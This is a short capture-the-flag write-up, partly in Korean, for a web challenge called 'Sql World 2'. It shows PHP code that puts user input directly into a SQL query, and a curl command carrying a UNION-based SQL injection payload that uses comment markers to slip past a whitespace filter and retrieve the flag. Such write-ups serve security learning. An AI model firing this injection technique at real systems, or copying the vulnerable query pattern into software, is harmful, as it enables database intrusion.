# Sql World 2
web.isangxcaution.xyz:20300/sql2.php

Made by smart_kang

Hint <br>
Ummm I think data isn't exists in sql2 table....

```php
<?php
    include "./config.php";
    $db = $link;
    $pw = '';
    if(isset($_GET['pw'])){
        $pw = $_GET['pw'];
        if(preg_match('/[[:space:]]/i', $_GET['pw'])) exit("No whitespace ~_~"); 
    }
    $query = "select id from sql2 where id='admin' and pw='$pw'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id']) echo $FLAG2;
    highlight_file(__FILE__);

?>
```
Union이나 Join 사용해서 sql1 table에서 select해오면 FLAG return.

```sh
❯ curl http://web.isangxcaution.xyz:20300/sql2.php\?pw\=%27/\*\*/union/\*\*/select/\*\*/id/\*\*/from/\*\*/sql1/\*\*/where/\*\*/id\=%27admin
<hr>query : <strong>select id from sql2 where id='admin' and pw=''/**/union/**/select/**/id/**/from/**/sql1/**/where/**/id='admin'</strong><hr><br><br><h2>FLAG : IxC{Th3r3_was_actually_n0_data_in_db~}</h2><br><code><span style="color: #000000">
```
